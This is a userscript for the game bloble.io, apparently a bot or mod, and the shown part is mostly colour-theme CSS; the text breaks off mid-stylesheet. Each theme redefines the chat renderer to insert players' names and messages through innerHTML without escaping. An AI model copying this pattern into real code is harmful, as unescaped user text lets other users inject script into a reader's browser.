// ==UserScript==
// @name         𝒟𝑀 Moderno BOTS
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  𝒟𝑀 Moderno
// @author       𝒟𝑀 Moderno
// @match        http://bloble.io/*
// @grant        none
// ==/UserScript==

var cameraSpd = 3.0;
var lastAlly = 0;
var joinEnabled = true;
//===================Tema==================//
var ThemeSelect = document.createElement('ThemeSelect');
var Theme=document.createElement("style");Theme.innerText=`#menuContainer{background:url("https://bit.ly/2CLHd93")fixed top no-repeat}#userNameInput{font-family:'regularF';font-size:30px;border-radius:8px;color:#ffffff;padding:10px;height:30px;width:500px;padding-left:20px;border:none;margin-left:10px}#enterGameButton{font-family:'regularF';padding-top:180px;font-size:30px;padding:0px;color:#ffffff;height:40px;width:120px;border:none;cursor:pointer;margin-left:0px;border-radius:8px}#skinSelector{position:top;display:inline-block;font-family:'regularF';font-size:24px;border:none;border-radius:8px;color:#ffffff;cursor:pointer}#leaderboardContainer{position:absolute;top:0px;right:0px;padding:10px;font-family:'regularF';font-size:24px;border-radius:5px;color:#ffffff}.leaderYou{display:inline-block;max-width:150px;margin-left:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;-o-text-overflow:ellipsis}.leader{color:#ffffff75;display:inline-block;max-width:150px;margin-left:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;-o-text-overflow:ellipsis}.upgradeInfo{margin-top:10px;padding:10px;background-color:#28282850;border-radius:8px;font-family:'regularF';max-width:200px;overflow:auto;cursor:pointer;pointer-events:all}.unitInfoDesc{font-size:14px}.unitInfoLimit{display:inline-block;float:right;text-align:right;padding-top:0px;font-size:18px}.unitInfoType{padding-top:0px;font-size:18px;float:left}.unitInfo{padding:10px;background-color:#28282850;border-radius:8px;font-family:'regularF';max-width:250px;overflow:auto}.unitInfoCost{font-size:16px}.unitInfoName{font-size:24px}#chatListWrapper{border-radius:4px 4px 0px 0px;height:200px}.memberscolor{color:#ff0000ab}.unitItem{pointer-events:all;margin-left:10px;position:relative;display:inline-block;width:69px;height:65px;border-radius:12px;cursor:pointer}#chatBox{FONT-VARIANT-EAST-ASIAN:JIS83;position:absolute;bottom:0px;right:10px;width:300px;overflow:hidden}#chatInput{font-family:'regularF';font-size:20px;padding:5px;width:100%;pointer-events:all;outline:none;border:white;box-sizing:border-box;border-radius:1px 1px 18px 18px}#scoreContainer{display:inline-block;padding:10px;font-family:"regularF";font-size:24px;border-radius:5px;color:#ffffff}#joinTroopContainer{display:inline-block;padding:10px;font-family:"regularF";font-size:18px;border-radius:15px;color:#ffffff50}#joinTroopContainer{display:inline-block;padding:12px;font-family:"regularF";font-size:18px;border-radius:5px;color:#ffffff}#TotalMembers{display:inline-block;padding:10px;font-family:"regularF";font-size:18px;border-radius:15px;color:#ffffff50}#TotalMembers{display:inline-block;padding:12px;font-family:"regularF";font-size:18px;border-radius:5px;color:#ffffff}`;
function Theme00(){var NormalTheme=document.createElement("style");NormalTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #fafafa50}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#ffffff}.greyMenuText{color:rgba(255,255,255,0.5)}#enterGameButton{background-color:#ff6060}#sellButton {border: 0.5px solid #000; }#skinSelector{background-color:#5783e0}#leaderboardContainer{background-color:rgba(40,40,40,0.5);border: 1px solid #000;}.botao {color: #greyMenuText;}.leaderYou{color:#ffffff60}.unitInfoDesc{color:#d1d1d1}.unitInfoLimit{color:#b2b2b2}.unitInfoType{color:#b2b2b2}.unitInfoCost{color:#fff}.unitInfoName{color:#fff}#chatListWrapper{background-color:rgba(60,60,60,0.6);border: 1px solid #000;}.chatText{color:rgba(255,255,255,0.65)}.unitItem{background-color:rgba(40,40,40,0.5)}#chatInput{background-color:rgba(30,30,30,0.6);color:#fff;border: 1px solid #000;}#scoreContainer{background-color:rgba(40,40,40,0.5);color: #000}#joinTroopContainer{background-color:rgba(40,40,40,0.5);color: #000}#TotalMembers{background-color:rgba(40,40,40,0.5);color: #000}.spanLink{color:#000}`;document.head.appendChild(NormalTheme);function ThemeNormal(){indicatorColor="#00000010",backgroundColor="#ebebeb",darkColor="#666666",outerColor="#d0d0d0",turretColor="#A8A8A8aa",bulletColor="#A8A8A8aa",redColor="#ff000025",targetColor="#A8A8A810"};ThemeNormal();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c=player.color);b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";20<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};
function Theme01(){var RedTheme=document.createElement("style");RedTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #ff0000ab}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#ff000050}.greyMenuText{color:#ff0000ab}#enterGameButton{background-color:#ff000050}#sellButton {border: 0.5px solid #000; }#skinSelector{background-color:#ff000050}#leaderboardContainer{background-color:#ff000050;border: 1px solid #000;}.botao {color: #ff0000ab;}.leaderYou{color:#ff0000}.unitInfoDesc{color:#ff4040}.unitInfoLimit{color:#ff0000}.unitInfoType{color:#9c0000}.unitInfoCost{color:#ff0000}#sellButton {border: 0.5px solid #000; }.unitInfoName{color:#b30000}#chatListWrapper{background-color:rgba(255,0,0,0.1);border: 1px solid #000;}.chatText{color:rgb(255,220,220)}.unitItem{background-color:#50000040}#chatInput{background-color:#ff000040;color:#ff0000;border: 1px solid #000;}#scoreContainer{background-color:#ff000050;color: #000}#joinTroopContainer{background-color:#ff000050;color: #000}#TotalMembers{background-color:#ff000050;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#ff0000aa}`;document.head.appendChild(RedTheme);function ThemeRed(){indicatorColor="#ff7d7d50",backgroundColor="#161600",darkColor="#ff000075",outerColor="#1b1b00",turretColor="#00000080",bulletColor="#ffff00",redColor="#ff000099",targetColor="#c90000"};ThemeRed();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#ff0000");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";20<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};
function Theme02(){var YellowTheme=document.createElement("style");YellowTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #ffff00ab}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#ffff0050}.greyMenuText{color:#ffff00ab}#enterGameButton{background-color:#ffff0050}#sellButton {border: 0.5px solid #000; }#skinSelector{background-color:#ffff0050}#leaderboardContainer{background-color:#ffff0050;border: 1px solid #000;}.botao {color: #ffff00ab;}.leaderYou{color:#ffff00}.unitInfoDesc{color:#ffff40}.unitInfoLimit{color:#ffff00}.unitInfoType{color:#9c9c00}.unitInfoCost{color:#ffff00}#sellButton {border: 0.5px solid #000; }.unitInfoName{color:#b3b300}#chatListWrapper{background-color:rgba(255,255,0,0.1);border: 1px solid #000;}.chatText{color:rgb(255,255,220)}.unitItem{background-color:#50500040}#chatInput{background-color:#ffff0040;color:#ffff00;border: 1px solid #000;}#scoreContainer{background-color:#ffff0050;color: #000}#joinTroopContainer{background-color:#ffff0050;color: #000}#TotalMembers{background-color:#ffff0050;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#ffff00aa}`;document.head.appendChild(YellowTheme);function ThemeYellow(){indicatorColor="#ffff7d50",backgroundColor="#161600",darkColor="#ffff0075",outerColor="#1b1b00",turretColor="#00000080",bulletColor="#ffff00",redColor="#ffff0099",targetColor="#c9c900"};ThemeYellow();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#ffff00");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";10<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};
function Theme03(){var GreenTheme=document.createElement("style");GreenTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #00ff00ab}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#00ff0050}.greyMenuText{color:#00ff00ab}#enterGameButton{background-color:#00ff0050}#sellButton {border: 0.5px solid #000; }#skinSelector{background-color:#00ff0050}#leaderboardContainer{background-color:#00ff0050;border: 1px solid #000;}.botao {color: #00ff00ab;}.leaderYou{color:#00ff00}.unitInfoDesc{color:#40ff40}.unitInfoLimit{color:#00ff00}.unitInfoType{color:#009c00}.unitInfoCost{color:#00ff00}#sellButton {border: 0.5px solid #000; }.unitInfoName{color:#00b300}#chatListWrapper{background-color:rgba(0,255,0,0.1);border: 1px solid #000;}.chatText{color:rgb(220,255,220)}.unitItem{background-color:#00500040}#chatInput{background-color:#00ff0040;color:#00ff00;border: 1px solid #000;}#scoreContainer{background-color:#00ff0050;color: #000}#joinTroopContainer{background-color:#00ff0050;color: #000}#TotalMembers{background-color:#00ff0050;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#00ff00aa}`;document.head.appendChild(GreenTheme);
function ThemeGreen(){indicatorColor="#7dff7d50",backgroundColor="#001600",darkColor="#00ff0075",outerColor="#001b00",turretColor="#00000080",bulletColor="#00ff00",redColor="#00ff0099",targetColor="#00c900"};ThemeGreen();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#00ff00");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";10<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};function Theme04(){var CyanTheme=document.createElement("style");CyanTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #00ffffab}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#00ffff50}.greyMenuText{color:#00ffffab}#enterGameButton{background-color:#00ffff50}#skinSelector{background-color:#00ffff50}#leaderboardContainer{background-color:#00ffff50;border: 1px solid #000;}.botao {color: #00ffffab;}.leaderYou{color:#00ffff}.unitInfoDesc{color:#40ffff}.unitInfoLimit{color:#00ffff}.unitInfoType{color:#009c9c}.unitInfoCost{color:#00ffff}.unitInfoName{color:#00b3b3}#chatListWrapper{background-color:rgba(0,255,255,0.1);border: 1px solid #000;}.chatText{color:rgb(220,255,255)}.unitItem{background-color:#00505040}#chatInput{background-color:#00ffff40;color:#00ffff;border: 1px solid #000;}#scoreContainer{background-color:#00ffff50;color: #000}#joinTroopContainer{background-color:#00ffff50;color: #000}#TotalMembers{background-color:#00ffff50;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#00ffffaa}`;document.head.appendChild(CyanTheme);
function ThemeCyan(){indicatorColor="#7dffff50",backgroundColor="#001616",darkColor="#00ffff75",outerColor="#001b1b",turretColor="#00000080",bulletColor="#00ffff",redColor="#00ffff99",targetColor="#00c9c9"};ThemeCyan();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#00ffff");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";10<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};function Theme05(){var BlueTheme=document.createElement("style");BlueTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #0000ffab}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#0000ff50}.greyMenuText{color:#0000ffab}#enterGameButton{background-color:#0000ff50}#skinSelector{background-color:#0000ff50}#leaderboardContainer{background-color:#0000ff50;border: 1px solid #000;}.botao {color: #0000ffab;}.leaderYou{color:#0000ff}.unitInfoDesc{color:#4040ff}.unitInfoLimit{color:#0000ff}.unitInfoType{color:#00009c}.unitInfoCost{color:#0000ff}.unitInfoName{color:#0000b3}#chatListWrapper{background-color:rgba(0,0,255,0.1);border: 1px solid #000;}.chatText{color:rgb(220,220,255)}.unitItem{background-color:#00005040}#chatInput{background-color:#0000ff40;color:#ff0000;border: 1px solid #000;}#scoreContainer{background-color:#0000ff50;color: #000}#joinTroopContainer{background-color:#0000ff50;color: #000}#TotalMembers{background-color:#0000ff50;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#0000ffaa}`;document.head.appendChild(BlueTheme);
function ThemeBlue(){indicatorColor="#7d7dff50",backgroundColor="#000016",darkColor="#0000ff75",outerColor="#00001b",turretColor="#00000080",bulletColor="#0000ff",redColor="#0000ff99",targetColor="#0000c9"};ThemeBlue();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#0000ff");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";10<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};function Theme06(){var PinkTheme=document.createElement("style");PinkTheme.innerText=`#noobscriptUI>div>div,.buttonClass{border: 0.5px solid #ff00ffab}.upgradeInfo,.unitInfo {border: 0.5px solid #000; }#userNameInput{background-color:#ff00ff50}.greyMenuText{color:#ff00ffab}#enterGameButton{background-color:#ff00ff50}#skinSelector{background-color:#ff00ff50}#leaderboardContainer{background-color:#ff00ff50;border: 1px solid #000;}.botao {color: #ff00ffab;}.leaderYou{color:#ff00ff}.unitInfoDesc{color:#ff40ff}.unitInfoLimit{color:#ff00ff}.unitInfoType{color:#9c009c}.unitInfoCost{color:#ff00ff}.unitInfoName{color:#b300b3}#chatListWrapper{background-color:rgba(255,0,255,0.1);border: 1px solid #000;}.chatText{color:rgb(255,220,255)}.unitItem{background-color:#50005040}#chatInput{background-color:#ff00ff40;color:#ff00ff;border: 1px solid #000;}#scoreContainer{background-color:#ff00ff50;color: #000}#joinTroopContainer{background-color:#ff00ff50;color: #000}#TotalMembers{background-color:#ff00ff50;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#ff00ffaa}`;document.head.appendChild(PinkTheme);
function ThemePink(){indicatorColor="#ff7dff50",backgroundColor="#160016",darkColor="#ff00ff75",outerColor="#1b001b",turretColor="#00000080",bulletColor="#ff00ff",redColor="#ff00ff99",targetColor="#c900c9"};ThemePink();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#ff00ff");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";10<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};function Theme07(){var DarkTheme=document.createElement("style");DarkTheme.innerText=`#noobscriptUI,#upgradeScriptCont{background-color:#00000050} #noobscriptUI>div>div,.buttonClass{border: 0.5px solid #ffffffab}.upgradeInfo,.unitInfo,sellButton {border: 0.5px solid #000; }#userNameInput{background-color:#ffffff50}.greyMenuText{color:#ffffffab}#enterGameButton{background-color:#ffffff50}#skinSelector{background-color:#ffffff50}#leaderboardContainer{background-color:#ffffff50;border: 1px solid #000;}.botao {color: #ffffffab;}.leaderYou{color:#000}.unitInfoDesc{color:#ffffff}.unitInfoLimit{color:#ffffff}.unitInfoType{color:#9c9c9c}.unitInfoCost{color:#ffffff}.unitInfoName{color:#b3b3b3}#chatListWrapper{background-color:rgba(255,255,255,0.1);border: 1px solid #000;}.chatText{color:rgb(255,255,255)}.unitItem{background-color:#50505040}#chatInput{background-color:#ffffff40;color:#ffffff;border: 1px solid #000;}#scoreContainer{background-color:#ffffff50;color: #000}#joinTroopContainer{background-color:#ffffff50;color: #000}#TotalMembers{background-color:#ffffff50;color: #000}.spanLink{cursor:pointer;color:#000}a:visited{color:#ffffffaa}`;document.head.appendChild(DarkTheme);
function ThemeDark(){indicatorColor="#ffffff50",backgroundColor="#161616",darkColor="#ffffff75",outerColor="#1b1b1b",turretColor="#00000080",bulletColor="#ffffff",redColor="#ffffff99",targetColor="#c9c9c9"};ThemeDark();window.addChatLine=function(a,d,c){if(player){var b=getUserBySID(a);if(c||0<=b){var g=c?"SERVER":users[b].name;var k=c?"SERVER":users[b].chatText;c=c?"#fff":playerColors[users[b].color]?playerColors[users[b].color]:playerColors[0];player.sid==a&&(c="#ffffff");b=document.createElement("li");b.className=player.sid==a?"chatme":"chatother";b.innerHTML='<span style="color:'+c+'" onclick=goto2('+a+');>'+g+' =></span> <span class="chatText">'+d+"</span>";10<chatList.childNodes.length&&chatList.removeChild(chatList.childNodes[0]);chatList.appendChild(b)}}}};window.SelectTheme=function(){var Active=document.getElementById('ThemeSelect'),HotbarColor=document.getElementById('noobscriptUI'),Hotbar2Color=document.getElementById('upgradeScriptCont'),BottomColor=document.getElementsByClassName('buttonClass');if(themeSelect==0){themeSelect=1;Active.innerHTML="Theme:<span class='greyMenuText'> Normal</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme00();HotbarColor.style="background-color: rgba(0,0,0,0.2);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(0,0,0,0.2);border: 2px solid #000";BottomColor.style="background-color: rgba(0,0,0,0.2)"}else if(themeSelect==1){themeSelect=2;Active.innerHTML="Theme:<span class='botao'> Ultron</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);TemaUltron();HotbarColor.style="background-color: rgba(0,0,0);border: 2px solid blue";Hotbar2Color.style="background-color: rgba(0,0,0);border: 2px solid blue";BottomColor.style="background-color: rgba(0,0,0)"}else if(themeSelect==2){themeSelect=3;Active.innerHTML="Theme:<span class='greyMenuText'> Yellow</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme02();HotbarColor.style="background-color: rgba(255,255,0,0.2);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(255,255,0,0.2);border: 2px solid #000";BottomColor.style="background-color: rgba(255,255,0,0.2)"}else if(themeSelect==3){themeSelect=4;Active.innerHTML="Theme:<span class='greyMenuText'> Green</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme03();HotbarColor.style="background-color: rgba(0,255,0,0.2);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(0,255,0,0.2);border: 2px solid #000";BottomColor.style="background-color: rgba(0,255,0,0.2)"}else if(themeSelect==4){themeSelect=5;Active.innerHTML="Theme:<span class='greyMenuText'> Cyan</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme04();HotbarColor.style="background-color: rgba(0,255,255,0.2);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(0,255,255,0.2);border: 2px solid #000";BottomColor.style="background-color: rgba(0,255,255,0.2)"}else if(themeSelect==5){themeSelect=6;Active.innerHTML="Theme:<span class='greyMenuText'> Blue</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme05();HotbarColor.style="background-color: rgba(0,0,255,0.2);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(0,0,255,0.2);border: 2px solid #000";BottomColor.style="background-color: rgba(0,0,255,0.2)"}else if(themeSelect==6){themeSelect=7;Active.innerHTML="Theme:<span class='greyMenuText'> Pink</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme06();HotbarColor.style="background-color: rgba(255,0,255,0.2);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(255,0,255,0.2);border: 2px solid #000";BottomColor.style="background-color: rgba(255,0,255,0.2)"}else{themeSelect=0;Active.innerHTML="Theme:<span class='greyMenuText'> Dark</span>";addChat(Active.innerHTML,'Server',playerColors[player.color]);Theme07();HotbarColor.style="background-color: rgba(0,0,0,0.5);border: 2px solid #000";Hotbar2Color.style="background-color: rgba(0,0,0,0.5);border: 2px solid #000"};window.statusBar();return ThemeSelect};
function TemaUltron() {darkColor = "blue", backgroundColor = "#000", outerColor = "#050505", indicatorColor = "#fff", turretColor = "#00000099", bulletColor = "#A8A8A8", redColor = "blue", targetColor = "#b4b4b4"; playerColors = "#f9ff6070 #ff606070 #82ff6070 #607eff70 #60eaff70 #ff60ee70 #e360ff70 #ffaf6070 #a3ff6070 #ff609c70 #60ff8270 #cc60ff70 #c6595970 #404b7f70 #f2d95770 #c5525270 #c5525270 #498e5670 #c4515170 #c3545470 #c8575770 #c8595970 #5b74b670 #cd686870 #5c81bd70 #5bb14670 #d8c96370 #c5525270 #404b7f70 #c5525270 #c5525270 #c5525270 #c5525270 #404b7f70 #498e5670 #498e5670 #dbd24570 #ca514e70 #43427e70".split(" ");var temaoficial=document.createElement("style");temaoficial.innerText=` html, body { width: 100%; height: 100%; cursor: Crosshair; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }  body { background-color: #ffffff; margin: 0; overflow: hidden; cursor: Crosshair; }  canvas { image-rendering: optimizeSpeed; image-rendering: -moz-crisp-edges; image-rendering: -webkit-optimize-contrast; image-rendering: -o-crisp-edges; image-rendering: crisp-edges; -ms-interpolation-mode: nearest-neighbor; }  .grecaptcha-badge { visibility: hidden !important; }  .material-icons {  }  a:link { color: #009bff;text-decoration: none; }  a:visited { color: #009bff; }  a:hover { color: #010b1a; }  .spanLink { cursor: pointer;color: #041d91; }  .allert { color: #850000; }  .botao { color: #041d91; }  .spanLink:hover { color: #010b1a; }  .deadLink { cursor: auto; color: #ffffff; }  .deadLink:hover { color: #ffffff; }  .horizontalCWrapper { width: 100%;text-align: center; }  .centerContent { text-align: center;width: 100%; }  #twitterFollBt { z-index: 200; }  #shareContainer { padding: 5px; width: 100%; position: absolute; top: 10px; left: 10px; position: absolute; z-index: 200; }  #darkener { display: block; position: absolute; width: 100%; height: 100%; background-color: #000000; }  #menuContainer { width: 100%; height: 100%; display: flex; position: absolute; top: 10px; z-index: 100; align-items: center; text-align: center; } #optionsContainer { padding: 10px; position: absolute; right: 1200px; top: 0px; font-family: 'regularF'; text-align: right; color: #009bff; z-index: 100; font-size: 20px; } #lobbyKey { font-size: 20px;  }  #smallAdContainer { position: absolute; right: 14px; bottom: 44px; z-index: 100; border: dashed 6px rgba(35, 35, 35, 0.0); }  #twitterFollBt { position: absolute;left: 15px;bottom: 40px; }  #followText { position: absolute; left: 15px; bottom: 75px; color: #fff; font-size: 28px; font-family: 'regularF'; }  #youtuberOf { z-index: 100; position: absolute; top: 10px; left: 10px; color: #fff; font-size: 20px; font-family: 'regularF'; }  #youtubeContainer { margin-top: 5px; }  #mainCanvas { position: absolute;width: 100%;height: 100%; }  #gameUiContainer { position: absolute; width: 100%; height: 100%; display: none; pointer-events: none; }  #adContainer { width: 100%; text-align: center; margin-top: 20px; display: inline-block; }  #adHolder { display: inline-block;border: dashed 6px rgba(35, 35, 35, 0.0); }  #leaderboardContainer { position: absolute; top: 10px; right: 10px; padding: 10px; background-color: #000000; font-family: 'regularF'; font-size: 30px; border-radius: 4px; color: #fff;border: 1px solid #041d91; }  .leaderboardItem { margin-top: 2px; color: rgba(255, 255, 255); font-family: 'regularF'; font-size: 17px; }  .leaderYou { color: #009bff; display: inline-block; max-width: 150px; margin-left: 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; -o-text-overflow: ellipsis; }  .leader { color: rgba(255, 255, 255); display: inline-block; max-width: 150px; margin-left: 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; -o-text-overflow: ellipsis; }  .scoreText { color: #c9c9c9; text-align: left; float: right; margin-left: 10px; display: inline-block; }  #statContainer { position: absolute;bottom: 10px;left: 10px; }  #scoreContainer { display: inline-block; padding: 10px; background-color: #000000; font-family: 'regularF'; font-size: 20px; border-radius: 10px; color: #041d91;}  #unitList { text-align: center; width: 100%; position: absolute; bottom: 6px; }  .unitItem { pointer-events: all; margin-left: 10px; position: relative; display: inline-block; width: 65px; height: 65px; background-color: #00000000; border-radius: 4px; cursor: pointer; }  .unitItemA { pointer-events: all; margin-left: 10px; position: relative; display: inline-block; width: 65px; height: 65px; background-color: #00000000; border-radius: 4px; cursor: pointer; }  .unitItem:hover { background-color: #00000060; }  #unitInfoContainer { padding: 10px;display: none; }  .upgradeInfo { margin-top: 5px; padding: 10px; background-color: #000000; border-radius: 4px; font-family: 'regularF'; max-width: 200px; overflow: auto; cursor: pointer; pointer-events: all;border: 0.5px solid #041d91; }  .upgradeInfo:hover { background-color: #000000; }  .unitInfo { padding: 10px; background-color: #000000; border-radius: 4px; font-family: 'regularF'; max-width: 200px; overflow: auto;border: 0.5px solid #041d91; }  .unitInfoName { font-size: 22px;color: #fff; }  .unitInfoCost { font-size: 16px;color: #fff; }  .unitInfoDesc { font-size: 16px;color: #d1d1d1; }  .unitInfoType { padding-top: 5px; font-size: 16px; color: #b2b2b2; float: left; }  .unitInfoLimit { display: inline-block; float: right; text-align: right; padding-top: 5px; font-size: 16px; color: #b2b2b2; }  #chatBox { position: absolute; bottom: 10px; right: 10px; width: 250px; overflow: hidden; }  #chatListWrapper { background-color: #000000;border-radius: 4px 4px 0px 0px;height: 215px;border: 1px solid #041d91; }  .chatText { color: rgba(255, 255, 255); }  #chatList { width: 100%; font-family: 'regularF'; padding: 8px; margin: 0; list-style: none; box-sizing: border-box; color: #fff; overflow: hidden; word-wrap: break-word; position: absolute; bottom: 30px; font-size: 16px; line-height: 23px; }  #chatInput { background-color: #000000; font-family: 'regularF'; font-size: 16px; padding: 5px; color: #fff; width: 100%; pointer-events: all; outline: none; border: 0; box-sizing: border-box; border-radius: 0px 0px 4px 4px;border: 1px solid #041d91; }  #sellButton { display: none; position: absolute; bottom: 65px; left: 10px; background-color: #000000; border-radius: 4px; font-family: 'regularF'; font-size: 16px; color: #fff; cursor: pointer; padding: 2px; pointer-events: all;border: 0.5px solid #041d91; }  #sellButton:hover { background-color: #000000;  }  .greyMenuText { color:#010409 }  .whiteText { color: #fff; }  #userNameInput { font-family: 'regularF'; font-size: 26px; padding: 6px; padding-left: 12px; border: none; border-radius: 4px; margin-left: 10px; background-color: #010409; color: #f9f9f9; border: 2px solid #041d91; border-radius: 10px; }  #enterGameButton { font-family: 'regularF'; font-size: 26px; padding: 5px; color: #ffffff; background-color: #010409; border: none; cursor: pointer; margin-left: 10px; border-radius: 4px; border: 2px solid #041d91; border-radius: 10px; }  #enterGameButton:hover { background-color: #010b1a; }  #loadingContainer { display: none; font-family: 'regularF'; font-size: 26px; padding: 6px; color: #FFFFFF; }  #gameTitle { color: #010409; font-size: 100px; width: 100%; text-align: center; font-family: 'regularF';text-shadow: 1px 0px 0px #041d91, -1px 0px 0px #041d91, 0px 1px 0px #041d91, 0px -1px 0px #041d91; }  #instructionsText { font-size: 30px; width: 400px; text-align: center; font-family: 'regularF'; margin-top: 20px; display: inline-block;text-shadow: 1px 0px 0px #041d91, -1px 0px 0px #041d91, 0px 1px 0px #041d91, 0px -1px 0px #041d91; }  #creatorLink { z-index: 1000; position: absolute; bottom: 0; text-align: center; font-size: 20px; font-family: 'regularF'; color: #009bff; padding: 5px; margin-left: 10px; margin-bottom: 5px; padding: 5px; }  #infoLinks { z-index: 1000; position: absolute; bottom: 0; right: 0; text-align: center; font-size: 20px; font-family: 'regularF'; color: #009bff; padding: 5px; margin-right: 10px; margin-bottom: 5px; }  #infoLinks2 { z-index: 1000; position: absolute; top: 0; right: 0; text-align: center; font-size: 20px; font-family: 'regularF'; color: #009bff; padding: 5px; margin-right: 10px; margin-bottom: 5px; }  #skinInfo { position: absolute; display: none; text-align: left; width: 110px; margin-left: -145px; padding: 6px; padding-top: 13px; padding-left: 16px; color:#ffffff; border-radius: 4px;  font-family: 'regularF'; font-size: 26px; background-color: #00000000 }  #skinName { padding: 4px;padding-left: 0px;color: #ffffff;font-size: 22px; }  #skinIcon { width: 100px;height: 100px }  #joinTroopContainer { display: inline-block; padding: 10px; background-color:#000000; font-family: 'regularF'; font-size: 20px; border-radius: 10px; color: #041d91;}  #skinSelector { display: none; font-family: 'regularF'; font-size: 26px; padding: 6px; padding-left: 10px; padding-right: 10px; border: none; border-radius: 4px; background-color: #010409; color: #ffffff; cursor: pointer; border: 2px solid #041d91; border-radius: 10px; }  #skinSelector:hover { background-color: #010b1a;color: #ffffff; } #TotalMembers { display: inline-block; padding: 10px; background-color: #000000; 